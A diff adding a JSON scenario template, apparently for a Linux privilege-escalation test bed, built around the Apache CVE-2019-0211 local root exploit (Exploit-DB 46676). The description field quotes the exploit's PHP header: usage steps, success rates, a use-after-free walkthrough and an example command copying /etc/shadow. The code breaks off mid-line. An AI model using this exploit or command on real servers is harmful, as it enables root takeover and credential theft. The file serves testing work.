@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_46676",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation (CVE-2019-0211)\n\nExploit source code (46676.php):\n```\n<?php\n# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation\n# Charles Fol\n# @cfreal_\n# 2019-04-08\n#\n# INFOS\n#\n# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html\n#\n# USAGE\n#\n# 1. Upload exploit to Apache HTTP server\n# 2. Send request to page\n# 3. Await 6:25AM for logrotate to restart Apache\n# 4. python3.5 is now suid 0\n#\n# You can change the command that is ran as root using the cmd HTTP\n# parameter (GET/POST).\n# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/\n#\n# SUCCESS RATE\n#\n# Number of successful and failed exploitations relative to of the number\n# of MPM workers (i.e. Apache subprocesses). YMMV.\n#\n# W  --% S   F\n#  5 87% 177 26 (default)\n#  8 89%  60  8\n# 10 95%  70  4\n#\n# More workers, higher success rate.\n# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.\n# Generally, failure is due to all_buckets being relocated too far from its\n# original address.\n#\n# TESTED ON\n#\n# - Apache/2.4.25\n# - PHP 7.2.12\n# - Debian GNU/Linux 9.6\n#\n# TESTING\n#\n# $ curl http://localhost/cfreal-carpediem.php\n# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force\n# $ ls -alh /usr/bin/python3.5\n# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5\n#\n# There are no hardcoded addresses.\n# - Addresses read through /proc/self/mem\n# - Offsets read through ELF parsing\n#\n# As usual, there are tons of comments.\n#\n\n\no('CARPE (DIEM) ~ CVE-2019-0211');\no('');\n\nerror_reporting(E_ALL);\n\n\n# Starts the exploit by triggering the UAF.\nfunction real()\n{\n\tglobal $y;\n\t$y = [new Z()];\n\tjson_encode([0 => &$y]);\n}\n\n# In order to read/write what comes after in memory, we need to UAF a string so\n# that we can control its size and make in-place edition.\n# An easy way to do that is to replace the string by a timelib_rel_time\n# structure of which the first bytes can be reached by the (y, m, d, h, i, s)\n# properties of the DateInterval object.\n#\n# Steps:\n# - Create a base object (Z)\n# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)\n# - Create DateInterval object ($place) meant to be unset and filled by another\n# - Trigger the UAF by unsetting $y[0], which is still reachable using $this\n# - Unset $place: at this point, if we create a new DateInterval object, it will\n#   replace $place in memory\n# - Create a string ($holder) that fills $place's timelib_rel_time structure\n# - Allocate a new DateInterval object: its timelib_rel_time structure will\n#   end up in place of abc\n# - Now we can control $this->abc's zend_string structure entirely using\n#   y, m, d etc.\n# - Increase abc's size so that we can read/write memory that comes after it,\n#   especially the shared memory block\n# - Find out all_buckets' position by finding a memory region that matches the\n#   mutex->meth structure\n# - Compute the bucket index required to reach the SHM and get an arbitrary\n#   function call\n# - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the\n#   bucket\nclass Z implements JsonSeri\n```",
+  "cve": "CVE-2019-0211",
+  "exploitdb_id": "46676",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_46676",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
